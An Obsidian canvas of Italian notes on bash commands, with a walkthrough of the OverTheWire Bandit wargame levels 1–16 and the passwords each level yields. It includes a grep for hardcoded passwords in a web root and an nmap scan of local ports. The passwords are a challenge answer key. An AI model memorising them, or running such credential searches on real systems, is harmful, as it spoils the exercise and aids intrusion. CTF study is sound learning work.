{
	"nodes":[
		{"id":"ea0a31adef225299","type":"text","text":"# Level 1, 2, 3, 4, 5\n\n1. Il file si chiama `-`, se provi a fare `cat -` ovviamente quello si aspetta che stai per scrivere un'opzione. Io ho risolto facendo `cp - /tmp/hello` (non avevo i permessi per scrivere altrove, `/tmp` è stato il best guess) e poi leggendo `cat /tmp/hello`.\n\n```\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\n```\n\n2. La difficoltà sarebbe che il file contiene spazi. A parte che se scrivi `cat s` e poi fai `tab` ti scrive già tutto in automatico, ma in caso te lo scordi puoi mettere l'escape character (`\\ `) oppure il nome tra virgolette (`cat 'spaces in this filename'`).\n\n```\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\n```\n\n3. I file nascosti si vedono con `ls -a`.\n\n```\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\n```\n\n4. Come prima, visto che i file cominciano con `-` tocca trovare un altro modo, tipo `cat ./-file00`. Non mi andava di controllarli uno per uno: sotto parliamo di ***script bash***.\n\n```\n4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\n```\n\n5. Qui il punto è: posso anche fare `for f in ./*; do ls -la ./$f; done | grep 1033`, e in effetti esce un unico file, il problema è che non mi dà il percorso (solo il nome!). Non so se ci sono modi per far stampare il percorso a `ls`, ma nel dubbio `du` lo fa già in modo nativo. Quindi `du -ab | grep 1033` (`-a` per stampare tutti i file e `-b` per le dimensioni in `byte`), restituisce `1033    ./maybehere07/.file2`, quindi `cat`. ***Oppure*** banalmente `find . -size 1033c`!! (non io che mi complico la vita).\n\n```\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG\n```","x":2820,"y":1027,"width":759,"height":859,"color":"4"},
		{"id":"d8bd274b8f96df69","type":"text","text":"# Bash - Enumerare e Leggere Cose\n\nAnzitutto bisogna capire ***cosa c'è*** nella directory, con ***`ls`***. `-l` mostra i dettagli dei vari file: `permessi #hard_link proprietario gruppo dimensione(byte) ultima_modifica nome`.\n\n - Posso ordinare i file per dimensione (`-lS`) o per ultima modifica (`-lt`)\n- Altre opzioni rilevanti sono `-a` (mostra anche i file nascosti), `-R` (mostra in modo ricorsivo il contenuto di tutte le sotto-directory), `-h` (`dimensione` viene tradotta in un formato più leggibile, e.g. `Kb`, `Gb`), `-d` (mostra solo le directory), `-i` (mostra gli ***inode*** dei file) e `-1` (mostra i file in una sola colonna, utile per creare liste);\n- Posso anche combinarlo con altri comandi per filtrare l'output:\n\t- ``ls -lhS | head -n 10`` mostra i 10 file più pesanti in formato leggibile;\n\t- `ls -l *.txt` mostra solo i file con estensione `.txt` (senza usare `grep`!).\n\nUna volta capito cosa c'è, la prossima domanda può essere ***cosa c'è dentro ai file***.\n\n- ***`file`*** - Restituisce la ***codifica del contenuto*** di un `file1` (e.g. `ASCII`, `EXIF`). Questo perché ci metto un attimo a salvare un'immagine come `immagine.txt` nonostante non sia affatto un `.txt` (... o un malware come `file.innocuo`);\n- ***`more`*** or ***`less`*** - Entrambi servono per ***mostrare il contenuto*** di un `file1`.\n\t- `more` è la versione più datata, stampa una riga per volta e ti fa andare solo avanti;\n\t- `less` è una sorta di reader integrato (come può essere `nano` per gli editor di testo), permette di andare su e giù e supporta la ricerca (`/parola` per l'occorrenza successiva, `?parola` per quella precedente).\n\t\t- ***`man`*** usa `less` come reader, e pertanto supporta la ricerca in questo modo.\n- ***`head`*** or ***`tail`*** - Non sempre voglio leggere davvero tutto il file. `head` mostra ***solo le prime `10` righe*** (`-n N` per mostrarne `N`), `tail` le ***ultime*** `10` (anche qui `-n N`);\n\t- `tail` può seguire in diretta l'evoluzione di un file con `-f` (e.g. `tail -f log.txt | grep \"error\"`, stampa in diretta solo gli errori).\n- ***`cat`*** - Nato originariamente con l'idea di concatenare più file in uno solo (`cat file1 file2 > file3` concatena i file `1` e `2` a formare il `file3`) viene di fatto utilizzato per ***stampare roba*** (`cat file1` mostra il contenuto di `file1` su `stdout`);\n\t- Le opzioni `-n` e `-b` su un singolo `file1` restituiscono rispettivamente il numero di righe di `file1` ed il numero di righe non vuote, `-s` stampa `file1` riducendo ogni `N` righe vuote consecutive ad una sola;\n\t- Ha una utile variante `tac` per ***stampare i file al contrario***!\n\t- Va facilmente in combo con i comandi di lettura di prima (e.g. `cat file1 | less`).\n","x":2820,"y":-166,"width":759,"height":957,"color":"4"},
		{"id":"7be47aaf1eeeeb0d","type":"text","text":"# Bash - Trovare Cose Velocemente: `locate`\n\nMentre `find` scorre ogni volta tutto l'albero del `filesystem`, `locate` costruisce e aggiorna periodicamente (ma ***non istantaneamente***!) un DB con le posizioni delle cose. \n\nSe cerco una roba che sta correttamente nel DB, `locate` è velocissima. Supporta le regex (se metto prima `-r`), come opzioni abbiamo `-i` (ignora `uppercase`), `-c` (mostra solo il numero di occorrenze trovate), `-b` (ricerca esatta, tipo `-w` di `grep`.\n\nPer aggiornare manualmente il DB, `sudo updatedb`.","x":3829,"y":1028,"width":759,"height":279,"color":"4"},
		{"id":"4e494b0e134ff4a7","type":"text","text":"# Bash - Trovare Cose nel `filesystem`: `find`\n\nForse il comando più potente di Linux. Per ***trovare `file` nel `filesystem`*** abbiamo\n\n```bash\nfind [path] [options] [criteria]\n```\n\n`[path]` è autoesplicativo: è il punto di partenza della ricerca. `[options]` e `[criteria]` vanno tipicamente insieme, perché posso cercare basandomi su\n\n- `-type` - il ***tipo*** di file. I più comuni sono `f` per i file \"standard\", `d` per le directory, `l` per i link simbolici, `c` per i file a caratteri (e.g. `/dev/tty`, terminale, o `/dev/random`,  generatore di numeri casuali), `b` per i file a blocchi (e.g. le partizioni come `/dev/sda` o `/dev/loop0`), `p` per i file `pipe` utili a far comunicare i processi tra loro ed `s` per i file di tipo `socket` (e.g. `Docker` si comporta come una specie di server interno al computer, ed ha un file `socket` a cui i processi devono mandare le richieste);\n\t- `-type` ricerca sostanzialmente sul tipo di ***inode***.\n- `-name` -  il ***nome*** del file. Come sintassi abbiamo `find /path -name \"criteri\"`;\n\t- Dentro i criteri posso usare le ***wildcard*** (o ***pathname expansions***) del `bash`:\n\t\t- `*` indica un numero qualsiasi di caratteri, `?` un singolo carattere, `{a, b}` esegue due comandi, uno per `a` e uno per `b` (e.g. `ls {giochi, libri}` legge sia la cartella `giochi` che la cartella `libri`);\n\t\t- `find / *_doc??.txt` cerca in tutto il `filesystem` tutti i file che iniziano con qualcosa (anche nulla!), poi hanno `_doc`, poi due caratteri qualsiasi e finiscono per `.txt`.\n\t- La variante `-iname` ignora la distinzione tra maiuscole e minuscole.\n- `-size` - la ***dimensione*** del file. Posso specificare una grandezza esatta o scrivere `+1G` (più grandi di `1 Gb`) e `-10M` (più piccoli di `1 MB`). Abbiamo `c` per i `byte` e `k` per i `kb`;\n- `-?time` - A seconda di `?` abbiamo una ricerca sui file `modificati` (`-mtime`, se ci riferiamo ai soli metadati abbiamo `-ctime`) e `letti` (`-atime`) negli ultimi  `tot` giorni;\n\t- `find /tmp -atime -1` restituisce i file letti nelle ultime 24 ore;\n\t- Varianti `-?min` per questa stessa cosa, ma con `tot` in minuti.\n- `-user`, `-group` - Specifica user e gruppo del file;\n- `-perm` - i ***permessi*** del file. Se cerco permessi specifici posso fare `-perm 400`, ma\n\t- Se mi interessano dei permessi minimi uso `-perm -400` (i.e. `trova tutti i file che possono essere letti dall'owner`) o in modo analogo `-perm -o=r`). In generale abbiamo `owner` (`u`), `group` (`g`), `others` (`o`) o `all` (`a`).","x":3829,"y":-165,"width":759,"height":957,"color":"6"},
		{"id":"625ede0e186681f5","type":"text","text":"# Level 6, 7, 8, 9\n\n6. Questa è una ricerca in tutto il filesystem partendo dalla radice e con criteri di dimensione e permessi. In questo caso è sufficiente `find / -type f -user bandit7 -group bandit6 2>/dev/null`.\n```\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n```\n\n7. Questa ricerca è ancora più facile, `cat data.txt | grep \"millionth` o `less data.txt` e poi `/millionth`.\n```\ndfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\n```\n\n8. Ok. Qua bisogna controllare il numero di occorrenze di un botto di roba. `grep -c` fa esattamente questo. Enumeriamo le righe con un `cat` in un ciclo `for` e stampiamo la riga che compare esattamente una volta:\n```bash\nfor line in $(cat data.txt); do if [[ $(grep -c \"$line\" data.txt) = 1 ]]; then echo $line; fi; done\n```\n- Questo ovviamente l'ho scritto prima di conoscere il comando `uniq`, che elimina le righe duplicate, ma ***adiacenti***. Fare `uniq -u data.txt` è quindi inutile, ma anche `sort -u` per qualche motivo non funziona. L'unico modo che ho trovato per farlo funzionare è `sort data.txt | strings | uniq -u`, una volta appurato che `sort` da solo funziona e che `strings` a quanto pare rende il tutto comprensibile per `uniq`. Vabbè, la chiave è\n\n```\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\n```\n\n9. Facile, `strings data.txt | grep \"===\"`.\n\n```\nFGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\n```","x":4838,"y":1028,"width":759,"height":858,"color":"4"},
		{"id":"19241c3faaf980ec","type":"text","text":"# Level 10, 11, 12\n\n10. Per decodificare `base64` abbiamo il comando... `base64 -d`.\n```\ndtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\n```\n\n11. Implementiamo il cifrario di Cesare con chiave 13 (anche detto `rot13`, che per qualche strano motivo non ha una funzione che lo implementa direttamente, tocca usare `tr`).\n\n```\n7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\n```\n\n12. Creiamo una cartella temporanea con `mktemp /tmp/mydir.XXX`. Non posso leggere `/tmp`, ma posso attraversarla. Copio `data.txt` in `mydir.ABC` e lo leggo. La prima riga dell'`hexdump` mi dice che è stato compresso con `gzip` (magic number `1f 8b`), quindi `xxd -r data.txt > unhex.txt.gz` (gli devi mettere l'estensione giusta, altrimenti si lamenta) per ricostruire il file compresso originale e `gunzip unhex.txt.gz` per estrarre `unhex.txt`. Costui è di nuovo un file binario, e non abbiamo idea della codifica in cui è scritto, quindi di nuovo `hexdump` (o `xxd`). Sorpresa! `42 5a` (che tra l'altro codificano `BZ` in `ASCII`), quindi rifacciamo lo stesso giochino con `bzip2`. Pensavo di aver finito, ma no! `1f 8b` è di nuovo il magic number di `gzip`. Ripetiamo.\n- Questo era il primo tentativo. Al secondo non mi faceva leggere la cartella `mydir.XXX`, boh. Ho trovato una cartella in cui potevo sia leggere che scrivere (`/run/lock`), ci ho abusivamente fatto una cartella e ho ricominciato il giochino di prima, stavolta usando `file` per controllare il formato dei risultati (invece dei magic numbers...). Così facendo scopriamo che il punto dove pensavo di aver finito al primo tentativo era in realtà metà del lavoro, perché quello era un file `.tar`! E poi `.gz`, e poi di nuovo `.tar`... Insomma, tutta così fino a `gunzip -c data8.bin.gz`, che contiene la `password`.\n\t- Nota per quando leggi l'`hexdump`: il primo archivio non aveva magic number noto, ma si potevano vedere i nomi dei file in esso contenuti, nella colonna `ASCII`!\n\n```\nFO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\n```","x":5847,"y":1029,"width":759,"height":857,"color":"4"},
		{"id":"df5e2abc8ea4b780","type":"text","text":"# Esempi di `grep`\n\n```bash\n# Stampa hello, hello123, hellothere\necho \"hello world, hello123, hellothere\" | grep -Eo 'hello\\w*'\n\n# Mostra solo i processi relativi a Firefox\nps aux | grep firefox\n\n# Estrae i soli numeri da un testo\necho \"ID: 123, User: 456, Code: 789\" | grep -Eo '[0-9]+'\n\n# Estrae i soli indirizzi IP da un file di log\ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" access.log\n\n# Estrae i soli indirizzi email da un file\ngrep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' file.txt\n\n# Trova password hardcoded\ngrep -r \"password\" /var/www/html/\n```","x":5847,"y":-165,"width":759,"height":957,"color":"3"},
		{"id":"3565595bf897b446","type":"text","text":"# Trasferire `files` in/da Remoto\n\nCi sono diverse alternative per copiare roba dal server remoto alla macchina da cui parte la connessione. Assumendo di conoscere il percorso dei file che mi interessano, posso\n\n- Loggare `ssh`, `cat` sui file che mi interessano e fare copia manuale. Se (come per il `livello 13`) devo copiare roba delicata come una chiave `RSA`, non è ottimale: potrei perdere informazioni di formattazione; \n- Usare il `Secure Copy Protocol` con sintassi `scp user@server:/file/on/server /target/on/my/pc` (per copiare qualcosa dal tuo pc al server inverti `source` e `target`). Ha opzioni per trasferire intere cartelle (`-r`) e per per farlo con compressione (`-C`);\n\t- ***Conviene usarlo se devo trasferire un solo file di cui conosco il path***.\n- Usare `Remote Sync`, sintassi `rsync user@server:/file/on/server /target/on/my/pc` (idem per l'inversione);\n\t- Un'***opzione*** molto interessante è ***`-a`***, che ***mantiene permessi***, timestamp e symlink. Mi conviene metterla perché `ssh` è schizzinoso, e accetta solo chiavi private con permessi `600` (i.e. solo il proprietario può fare `r/w`);\n\t- `-u` evita di sovrascrivere file con timestamp più recente;\n\t- `-v` (`verbose`) dà più info sul trasferimento;\n\t- `-z` comprime i file prima di inviarli;\n\t- Se usi il server come backup ed elimini un file in locale, al prossimo `rsync` vorresti che venga eliminato anche in remoto. Per questo esiste l'opzione `--delete`;\n\t- Se avevi iniziato un grosso trasferimento ma poi è saltata la luce, puoi ripetere il comando dicendogli di recuperare i dati che aveva già scaricato con `--partial`;\n\t- ***Conviene usarlo se ho tanta roba da trasferire***;\n- Usare `Secure File Transfer Protocol`. `sftp user@server` apre una connessione `SFTP` che si traduce in una shell interattiva che collega due `directory`: quella del `server`, nel quale navigo normalmente con i comandi della shell, e quella dell'`host`, nel quale navigo con gli stessi comandi con una `l` davanti (e.g. `lcd`, `lls`, ...);\n\t- Ho i comandi tipici di `FTP`: `get file_on_server.txt`, `put file_on_host.txt`;\n\t- Aggiungo `-r` per scaricare intere cartelle;\n\t- Uso `mget [files]` ed `mput [files]` per gestire file multipli;\n\t- Chiudo la connessione con `exit` o con `bye`;\n\t- ***Conviene usarlo se mi interessa navigare nel `server` per cercare cosa trasferire***.\n- Usare `netcat` (`nc`). Vedi il rettangolo più a destra.","x":6857,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"22b8634d71376455","type":"text","text":"# Level 13, 14, 15, 16\n\n13. Per usare `scp` sulla porta `2220`, `scp -P 2220 [resto del comando]`, mentre per `rsync` bisogna proprio dirgli di usare `ssh` con `rsync [options] -e \"ssh -p 2220\"`. Usiamo il primo. Non c'è `password`, ma ora abbiamo una `private key` in `~/.ssh`.\n14. Anzitutto, `chmod 600 ~/.ssh/sshkey.private` per settare i permessi della chiave privata (che altrimenti `ssh` piange). Quindi procediamo a specificare di usarla, con `ssh -p 2220 -i ~/.ssh/sshkey.private bandit14@bandit.labs.overthewire.org`. La password è in `/etc/bandit_pass/bandit14`, e va mandata a `localhost` sulla porta `30000`. Lo facciamo con `nc -v localhost 30000`, che ci restituisce la `password`.\n\n```\n8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\n```\n\n15. Qui apriamo una connessione con `openssl` invece che con `nc`. Il comando completo  è `openssl s_client localhost:30001` e poi mandiamo la `password` precedente.\n\n```\nkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\n```\n\n16. Grazie ad uno `script` di `nmap` possiamo cercare direttamente le porte che parlano `SSL/TLS`: basta fare `nmap -p 31000-32000 --script ssl-cert localhost`. Ne risultano due server che parlano `ssl`, andando a tentativi troviamo che quello sulla porta `31790` non chiude subito la connessione. Inviando la `password` il server chiede un `KEYUPDATE`. Leggendo il manuale (i.e. facendolo leggere all'AI) troviamo che per rispondere a questa richiesta di aggiornare le chiavi devi inviare `R` o `K`. Non funziona ahahah\n\t- Ok, questa roba è incredibile. Visto che la vecchia password inizia con `k`, quando la mando al server questo vede la prima lettera ed assume che io gli stia mandando una richiesta di `KEYUPDATE`. Quindi? Esistono modi per impedire che le cose che scrivo vengano interpretate come comandi a caso. Qui in particolare bisogna mettere l'opzione `-quiet`. Che dire.\n```\n\n```","x":7866,"y":1029,"width":759,"height":857,"color":"1"},
		{"id":"d6df1ebc088bc55b","type":"text","text":"# Crittografia\n\nIl cifrario di ***Cesare*** si può implementare con il comando `tr`:\n\n```bash\n cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\n```\n\nQuesto in particolare è ***rot13***, perché fa comodo (critta e decritta nello stesso verso).\n\nUna codifica molto comune è `base64` (`-d` per decrittare), con sintassi\n\n```bash\necho \"YW5nZWxvOmFuZ3Nw\" | base64 -d\n```\n\n\n\n","x":6857,"y":2118,"width":759,"height":951},
		{"id":"28c7fa5a4a2add1f","type":"text","text":"# Hexdump\n\nI programmi aprono i `file` basandosi sull'estensione, scelgono cosa mostrare o non sono in grado di rappresentare correttamente tutte le informazioni in esso contenute. Questo significa che il vero controllo è sui singoli `byte`. Ma come li leggo?\n\nAnzitutto converto l'intero `file` in binario (o meglio, in esadecimale, che altrimenti è una roba illeggibile). Questa roba si fa con `hexdump`, preferibilmente con opzione `-C`, che stampa un formato più user-friendly di tipo\n\n```\n# OFFSET                # VALORI BYTES                           # ASCII\n0001ff00  50 4b 05 06 00 00 00 00  01 00 01 00 5a 00 00 00  |PK..........Z...|\n```\n\n`OFFSET` indica il primo `byte` che compare in `VALORI BYTES`. Il `byte 1ff00` assume valore esadecimale `50` (`80` in decimale), che in `ASCII` indicizza il carattere `P`. In questo caso, `50 4b` (i.e. `PK`) è il ***magic number*** di un file `.zip`, mentre `05 06` identifica la fine di un file `.zip` (`End of Central Directory Record`).\n\nQuesto per dire che i dati nascosti includono il reale formato del file, indipendentemente dall'estensione che risulta nel `filesystem`. Esempi di magic numbers sono `89 50 4E 47` (`PNG`), `FF D8 FF` (`JPEG`) e `7F 45 4C 46` (`ELF`, i.e. eseguibile Linux), e si trovano all'inizio della prima riga dell'`hexdump`.\n\nAltra cosa comune è individuare la presenza di ***metadati***. Un file `mp3` può ad esempio contenere, oltre alla musica, informazioni quali `titolo`, `artista` e via dicendo. Questi dati vengono spesso ignorati da un `media player`, ma stanno là!\n\n```\n0001fa20  49 44 33 04 00 00 00 00  00 21 54 49 54 32 00 00  |ID3......TIT2..|\n```\n\nIn questo esempio `ID3` rappresenta il formato dei metadati su `mp3`. Questa riga del file di `hexdump` indica che a partire dal `byte 1fa20` troveremo i metadati sulla traccia audio.\n\nAltri esempi di metadati sono i formati `EXIF` (per `JPEG`) e `XMP` (su `PDF Adobe`).\n\nInfine, ovviamente, tutto questo si può usare per nascondere messaggi nei `file`.","x":4838,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"09449e1e2bf4e019","type":"text","text":"# Interpretare un `hexdump`\n\nTutto molto bello, ma posso fare così solo se sono io ad eseguire `hexdump -C`. Come faccio se trovo un file `hexdump` senza interfaccia user-friendly `-C`?\n\nPosso tornare al file originale con il comando `xxd`. Di per sé fa la stessa cosa di `hexdump`, ma a differenza di quest'ultimo ha una simpatica opzione `-r` per ***tornare indietro***.\n\n```bash\nxxd [opzioni] [file] [output]\n```\n\n- `-p` se hai un input di soli esadecimali (senza impaginazione user-friendly);\n- `-g [N]` ti permette di vedere `N byte` alla volta direttamente tradotti in `ASCII`.","x":4838,"y":3314,"width":759,"height":345,"color":"4"},
		{"id":"fde5e59d70e6ddbe","type":"text","text":"# Compressione e Archiviazione\n\nL'idea alla base della compressione è la seguente: i dati sono spesso ridondanti, posso trovare una ***rappresentazione più compatta*** perdendo poca o nessuna informazione.\n\nIdealmente vorremmo una compressione ***lossless*** (senza perdita di informazione) per cose come codici e file di sistema. Come si ottiene?\n\n- ***Run-Length Encoding*** (***RLE***) - `AAAAAAAAAA` $\\to$ `10A`;\n- ***Dizionari*** - `ABCDABCDABCD` $\\to$ `ABCD[1,4]`;\n- ***Huffman Coding*** - `1010101011111000` $\\to$ `10 = A`, `11 = B`, `00 = C`$\\to$ `AAAABBAC`.\n\nPosso invece applicare compressioni ***lossy*** a file meno importanti (e.g. `jpeg` elimina alcuni dettagli poco visibili). Abbiamo diversi comandi/algoritmi built-in nella shell:\n\n- `gzip` - Compressione rapida, ma non ottimale. `gunzip` torna indietro, se specifico `-k` quando comprimo mantiene anche il file originale. Estensione `.gz`;\n- `bzip2` - Più lento, ma più ottimizzato. `bunzip2` torna indietro. Estensione `.bz2`;\n- `xz` - Lentissimo ma efficientissimo. `unxz` torna indietro. Estensione `.xz`.\n\nPer scegliere il file di destinazione tocca usare l'opzione `-c` (sceglie `stdout` come output) e poi reindirizzare sul file che voglio con un `>` finale.\n\n\"Ma perché vedo spesso la doppia estensione `.tar.gz`?\"\n\nQuesto accade quando si comprime (`.gz`) un ***archivio*** (`.tar`). E che roba è? Se devo mandare file multipli, non posso semplicemente inviare una `directory` (banalmente, lei è solo un'organizzazione logica dei puntatori agli `inodes` del `filesystem` locale). Allora creo un file `archivio` in cui metto tutti i file che voglio mandare. In pratica, è come fosse una `directory`, ma è un `file`. Chiaro, no?\n\nLinux usa tendenzialmente il comando `tar` (`Tape ARchive`) per gestire gli `archivi`.\n\n```bash\ntar [opzioni]\n```\n\n- `-c [input_files]`, `-x` - Rispettivamente, crea ed estrae un archivio. Devo sempre specificarne il nome, con `-f [target]`. Si usano quindi in genere insieme: `tar -cf [target] [input_files]` e `tar -xf [target]`;\n- Può integrare una compressione, usando `gzip` (`-z`), `bzip2` (`-j`) o `xz` (`-J`).","x":5847,"y":2118,"width":759,"height":951,"color":"4"},
		{"id":"04825a06a9d94d59","type":"text","text":"# Bash - Controllo di Flusso\n\n```bash\nfor f in ./*; do echo \"file $f: \"; cat \"$f\"; echo; echo; done\n```\n\nQuesta è la ***concatenazione*** di comandi bash con cui si può risolvere il livello 4. In generale:\n\n- `comando &` esegue il `comando` in ***background***;\n- `c1; c2` esegue prima `c1` e poi `c2`, ***indipendentemente dall'esito*** del primo;\n- `c1 && c2` esegue `c2` solo se `c1` ha ***successo*** (i.e. `exit status 0`);\n- `c1 || c2` esegue `c2` solo se `c1` ***fallisce*** (e.g.  `mkdir prova || echo \"errore\"`).\n\nQualsiasi comando ha due tipologie di output: ***`stdout`*** per i risultati ordinari e ***`stderr`*** per gli errori. Se non viene specificato diversamente, entrambi vengono stampati su terminale. Altrimenti, entriamo nel mondo degli ***operatori di reindirizzamento***:\n\n- `comando > file` sovrascrive `file` con lo `stdout` di `comando`, mentre `comando >> file` lo aggiunge in coda (`append`);\n- `comando 2> file` e `comando 2>> file` discorso analogo, ma con `stderr`;\n\t- Posso anche dare entrambi i comandi insieme, e.g. `comando > file 2> errors` reindirizza `stdout` in `file` e `stderr` in `errors`;\n\t- Molto comune è la scrittura `2> /dev/null`, che reindirizza gli errori in un file che fa le veci di un buco nero in cui tutto viene distrutto (per un output più pulito). \n- `comando &> file` reindirizza entrambi, e anche lui ha il suo analogo in versione `append` con `comando &>> file.log`. Questa sarebbe la forma abbreviata di `comando > output 2>&1`, cioè `metti stdout in output, e stderr dove hai messo stdout`;\n\t- È l'unico caso in bash in cui `&` viene usato come \"puntatore\" (allo stream `1`).\n- `comando < file` usa `file` come input per `comando`;\n- `c1 | c2` esegue `c1`, quindi passa il suo output come input di `c2`.\n\t- I comandi \"telefonati\" da usare con `|` sono `grep` e `tee` (`comando | tee file` mostra l'output di `comando` a schermo e lo salva anche su `file`).\n","x":2820,"y":2117,"width":759,"height":797,"color":"4"},
		{"id":"efbeb23d6fccc658","type":"text","text":"# Script Bash\n\nOgni ***script bash*** inizia con `#!/bin/bash`. Perché? Bash è un ***linguaggio interpretato***, e questo simpatico operatore `#!` (detto ***shebang***, da `sharp (#) + bang (!)` se te lo stessi chiedendo) serve a specificare il percorso dell'interprete da usare. Per capirci, se scrivi `#!/usr/bin/python3` e poi esegui `./script.py`, questo verrà interpretato in automatico da `python3`, senza bisogno di scrivere sulla shell `python3 script.py`. \"Quindi posso non mettere `#!/bin/bash` e scrivere direttamente sulla shell `bash script.sh`?\". Sì, ma basta con le digressioni, andiamo avanti.\n\nTutti questi operatori ci portano con molta naturalezza a voler mettere un botto di comandi in fila utilizzando i costrutti fondamentali di un qualsiasi linguaggio di programmazione.\n\nTutti i costrutti che seguono possono essere scritti come singola riga. In quel caso, gli \"a capo\" si sostituiscono con l'operatore `;`. Partiamo con l'`if` e vediamo un esempio:\n\n```bash\nif [[ condizione ]]; then\n\tcomando1\n\tcomando2\nelif [[ altra condizione ]]; then\n\tcomando3\nelse\n\tcomando4\nfi\n```\n\nChe su una sola riga diventa\n\n```bash\nif [[ condizione ]]; then comando1; comando2; elif [[ altra condizione ]]; then comando3; comando4; else comando4; fi\n```\n\nPuò essere utile `case`, quando mettere troppi `elif` diventa noioso:\n\n```bash\ncase variabile in\n\tpattern1) comando1 ;;\n\tpattern2) comando2 ;;\n\t...\n\t*) comando_default ;;\nesac\n```\n\nSeguono i `loop`: `for`, `while` e poi boh, a qualcuno evidentemente non andava di scrivere `while [[ ! condizione]]` (che continua a girare finché `! condizione` non diventa `True`) e si è inventato `until [[ condizione ]]` (gira finché `condizione` non diventa `False`).\n\n```bash\nfor var in elenco; do\n\tcomando1\n\tcomando2\ndone\n```\n\n```bash\nwhile [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\n```bash\nuntil [[ condizione ]]; do\n    comando1\n    comando2\ndone\n```\n\nIn basso segue come definire le funzioni.","x":3829,"y":2118,"width":759,"height":1541,"color":"4"},
		{"id":"3d73dc291ec51cb6","type":"text","text":"# Bash - Espansioni, Espressioni, Logica\n\nPer avere il quadro completo manca il ruolo del meraviglioso operatore `$`.\n\n- ***`$f`*** (***espansione di variabile***) - Se `f` è una variabile, `$f` sostituisce il suo contenuto;\n- ***`$(comando)`*** (***espansione di comando***) - Ogni `comando` restituisce un certo output. Questa scrittura esegue `comando` e ne utilizza l'output in una espressione;\n- ***`$((algebra))`*** (***espressione algebrica***) - Questa scrittura esegue operazioni di `algebra` elementare. Non si possono innestare comandi (e.g. `du`) al suo interno!\n\nA questo dobbiamo aggiungere l'operatore di ***test logico*** per condizioni booleane. La scrittura è `[[ condizione ]]`, e restituisce il valore `True` o `False` della `condizione`.\n\n- ***Test su `file`*** - La scrittura `-X file` restituisce `True` se, per diversi `-X`, `file`\n\t- esiste (`-e`), è un file (`-f`), è una directory (`-d`), è non-vuoto (`-s`);\n\t- è leggibile (`-r`), scrivibile (`-w`) o eseguibile (`-x`);\n- ***Confronto tra `file`*** - La scrittura `file1 -nt file2` restituisce `True` se `file1` è più nuovo (i.e. ha data di modifica più recente) di `file2` (e viceversa con `-ot`);\n- ***Test su `stringa`*** - `-z str` restituisce `True` se `str` è vuota (non-vuota con `-n`);\n- ***Confronto tra `stringhe`*** - Classici operatori di `=`, `!=`, `>` e `<` (questi ultimi due a livello lessicografico). Molto è interessante è verificare se una `stringa` è il prodotto di una ***regex*** con la condizione `str =~ regex`;\n- ***Confronto tra numeri*** - Classici operatori `-eq`, `-ne`, `-lt` `-le`, `-gt`, `-ge`.\n\nPuoi combinare più `condizioni` secondo gli operatori `&& (AND)`, `|| (OR)` e `! (NOT)`.","x":2820,"y":3013,"width":759,"height":646,"color":"4"},
		{"id":"592cc115c760d58b","type":"text","text":"# Script Bash - Funzioni\n\nCi sono due modi equivalenti di dichiarare le funzioni:\n\n```bash\nfunction nome_funzione {\n    comando1\n    comando2\n}\n```\ne\n```bash\nnome_funzione() {\n    comando1\n    comando2\n}\n```\n\nIn ogni caso, i ***parametri*** non vanno passati tra parentesi.\n\n```bash\nsomma() {\n\techo $(( $1 + $2 ))\n}\n\nsomma 4 5    # Output: 9\n```\n\nIntuitivamente, `$N` è l'`N`-esimo parametro passato, dove `N` può essere qualsiasi (il numero di parametri letti dalla funzione è accessibile con `$#`). Posso poi prendere tutti i parametri insieme e trattarli come ***lista*** (`$@`) o come ***stringa*** (`$*`).\n\n`return` qui rappresenta il codice di uscita, ed è pertanto recuperabile con `$?` (restituisce il codice di uscita dell'ultimo comando eseguito) subito dopo la sua esecuzione.\n\nTutte le variabili dentro le funzioni sono intese come globali, salvo specifica `local`.\n\nUn'applicazione interessante è fare override di comandi noti, e.g.\n\n```bash\nls() {command ls --color=auto \"$@\"}\n\nls   # Usa ls con colori sempre attivi\n```","x":3829,"y":3894,"width":759,"height":935,"color":"4"},
		{"id":"b008c9c94e60d49d","type":"text","text":"# Bash - Opzioni Avanzate per `find`\n\nPosso combinare diverse `options` con i classici operatori logici.\n\n- `AND` - è sottinteso (se proprio vuoi sarebbe `-a`, ma basta mettere più opzioni in fila;\n- `OR` - è `-o`, ma devi stare attento alle parentesi (che vanno messe con l'escape `\\`), e.g. `find /home -type f \\( -name \"*.mp3\" -o -name \"*.flac\" \\)`;\n- `NOT` - basta il `!`, seguito da spazio (non attaccarlo alla cosa da negare!).\n\nPosso limitare la profondità della ricerca (`-maxdepth`) o ignorare i primi livelli (`-mindepth`).\n\nMa `find` è più potente di una semplice ricerca, perché permette contestualmente di ***eseguire comandi sui file trovati***.\n\n- `-print` - Stampa il percorso completo dei file trovati;\n- `-delete` - Elimina direttamente tutto ciò che trova (***pericoloso!***);\n- `-exec` - Permette di eseguire ***qualsiasi comando `bash`*** sui file trovati.\n\t- `find / -name \"*.log\" -exec du -h {} \\;` - mostra la dimensione dei file trovati;\n\t\t- `{}` è un ***placeholder*** per la lista dei file che trova (quindi deve comparire in ogni comando che segue `-exec`);\n\t\t- `\\;` indica la fine del comando da eseguire per ogni file trovato. Bisogna mettere l'escape `\\` per evitare che la shell lo interpreti come concatenazione.\n\t- `find /home -name \"*.jpg\" -exec mv {} /backup/foto/ +` - Sposta tutti i file `.jpg` in una cartella di backup;\n\t\t- `+` serve ad eseguire la `mv` in parallelo, piuttosto che in serie.\n\t- Lasciamo ulteriori esempi in un quadratone a parte.\n\nAltri utilizzi furbi 